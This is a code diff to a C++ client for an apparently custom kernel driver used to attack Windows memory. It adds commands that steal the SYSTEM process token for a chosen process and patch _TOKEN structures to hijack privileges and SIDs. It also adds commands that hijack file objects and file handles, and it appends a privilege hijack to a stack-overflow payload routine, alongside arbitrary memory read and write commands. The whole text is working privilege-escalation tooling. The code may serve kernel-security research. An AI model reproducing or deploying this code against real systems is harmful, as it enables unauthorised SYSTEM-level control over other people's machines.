@@ -5,10 +5,26 @@ using namespace std;
 namespace mem_attacker {
 
 	/* Set NT AUTHORITY\\SYSTEM privileges to the process */
-	bool MemAttacker::set_priv() {
+	bool MemAttacker::token_stealing() {
 		ULONG64 proc_id = 0; cin >> std::dec >> proc_id;
 		bool b_res =
-			scm_manager.send_ctrl_code(MEM_ATTACKER_SET_PRIVS, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
+			scm_manager.send_ctrl_code(MEM_ATTACKER_TOKEN_STEALING, (LPVOID)&proc_id, sizeof ULONG64, NULL, 0, 0);
+
+		return b_res;
+	}
+
+	/*   */
+	bool MemAttacker::hijack_privs() {
+		HIJACK_PRIVS_DATA data = { 0 }; cin >> std::dec >> data.processID;
+		bool b_res =
+			scm_manager.send_ctrl_code(MEM_ATTACKER_HIJACK_PRIVS, (LPVOID)&data, sizeof HIJACK_PRIVS_DATA, NULL, 0, 0);
+
+		if (data.is_privs_hijacking_ok) {
+			wcout << "  The  _TOKEN structure  has been patched!  " << endl;
+		}
+		else {
+			wcout << "  The  _TOKEN structure  cannot be patched!  " << endl;
+		}
 
 		return b_res;
 	}
@@ -72,8 +88,12 @@ namespace mem_attacker {
 		return ctl_files::open_file(scm_manager, MEM_ATTACKER_OPEN_ONLY);
 	}
 
-	bool MemAttacker::file_by_hijacking() {
-		return ctl_files::open_file_by_hijacking(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING);
+	bool MemAttacker::file_by_hijacking_fileobj() {
+		return ctl_files::open_file_by_hijacking_fileobj(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING_FILEOBJ);
+	}
+
+	bool MemAttacker::file_by_hijacking_filehandle() {
+		return ctl_files::open_file_by_hijacking_filehandle(scm_manager, MEM_ATTACKER_OPEN_BY_HIJACKING_FILEHANDLE);
 	}
 
 	bool MemAttacker::read_file() {
@@ -183,14 +203,18 @@ namespace mem_attacker {
 	bool MemAttacker::run_stack_overflow_with_payload(){
 		DWORD proc_id = 0; cin >> std::dec >> proc_id;
 		auto b_res = false;
+		
 		{ // PayloadStackOverFlow constructor
 			payload_stack_overflow::PayloadStackOverFlow my_payload(proc_id);
 			if (my_payload.init()) {
 				b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_SIMPLE_STACK_OVERFLOW,
 					my_payload._buffer, my_payload._bufferSz, NULL, 0, 0);
-
 			}
 		} // PayloadStackOverFlow destructor
+		
+		b_res = scm_manager.send_ctrl_code(MEM_ATTACKER_HIJACK_PRIVS,
+			(LPVOID)&proc_id, sizeof DWORD, NULL, 0, 0);
+
 		return b_res;
 	}
 
@@ -311,7 +335,9 @@ namespace mem_attacker {
 		*/
 		
 // 		add_unique_command("hide", &mem_attacker::MemAttacker::hide_proc, " <ProcessId in dec> ' --  hide process with <ProcessId> by unlinking");
-// 		add_unique_command("priv", &mem_attacker::MemAttacker::set_priv, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM privs for <ProcessId>");
+ 		add_unique_command("steal_token", &mem_attacker::MemAttacker::token_stealing, " <ProcessId in dec> ' --  set NT AUTHORITY\\SYSTEM for <ProcessId> by swap Token from System:4");
+
+		add_unique_command("hijack_privs", &mem_attacker::MemAttacker::hijack_privs, " <ProcessId in dec> ' --  hijack privileges and SIDs from System:4");
 
 		add_unique_command("read_byte", &mem_attacker::MemAttacker::read_1byte, " <Address>  ' -- read 1 byte from memory <Address>");
 		add_unique_command("write_byte", &mem_attacker::MemAttacker::write_1byte, " <Address> <Value in hex>' -- write 1 byte to memory <Address>");
@@ -322,12 +348,20 @@ namespace mem_attacker {
 // 		add_unique_command("write_data",
 // 			&mem_attacker::MemAttacker::write_char_data, " <addr> <char[]>' -- write char[] data to <addr> ");
 
+//		add_unique_command("write8", 
+//			&mem_attacker::MemAttacker::write_8bytes, " <Address> <Value in hex>' -- write 8 bytes to memory <Address>");
+
 		add_unique_command(ctl_files::f_create_command, &mem_attacker::MemAttacker::create_file, ctl_files :: f_create_descript);
 
 		add_unique_command(ctl_files::f_open_command, &mem_attacker::MemAttacker::open_file, ctl_files::f_open_descript);
 
-		add_unique_command(ctl_files::f_open_by_hijacking_command, &mem_attacker::MemAttacker::file_by_hijacking,
-			ctl_files::f_open_by_hijacking_descript);
+		add_unique_command(ctl_files::f_open_by_hijacking_fileobj_command, 
+			&mem_attacker::MemAttacker::file_by_hijacking_fileobj,
+			ctl_files::f_open_by_hijacking_fileobj_descript);
+
+		add_unique_command(ctl_files::f_open_by_hijacking_filehandle_command,
+			&mem_attacker::MemAttacker::file_by_hijacking_filehandle,
+			ctl_files::f_open_by_hijacking_filehandle_descript);
 
 		add_unique_command(ctl_files::f_read_command, &mem_attacker::MemAttacker::read_file, ctl_files::f_read_descript);
 
@@ -335,7 +369,8 @@ namespace mem_attacker {
 
 		add_unique_command(ctl_files::f_close_command, &mem_attacker::MemAttacker::close_file, ctl_files::f_close_descript);
 
-		//add_unique_command("write8", &mem_attacker::MemAttacker::write_8bytes, " <Address> <Value in hex>' -- write 8 bytes to memory <Address>");
+		//////////////////////////////////////////////////////////////////////////
+		
 		//add_unique_command("test_stack", &mem_attacker::MemAttacker::run_simple_stack_overflow, " <BufferSize>' -- test stack overflow with <BufferSize>");
 		//add_unique_command("stack", &mem_attacker::MemAttacker::run_stack_overflow_with_payload, " <UniqueProcessId in dec>' -- set NT AUTHORITY\\SYSTEM privileges for <UniqueProcessId> via stack overflow [SMEP BSOD issue]" );
 		//add_unique_command("test_uaf", &mem_attacker::MemAttacker::run_use_after_free, "' -- run simple use after free, which cause a BSOD ");
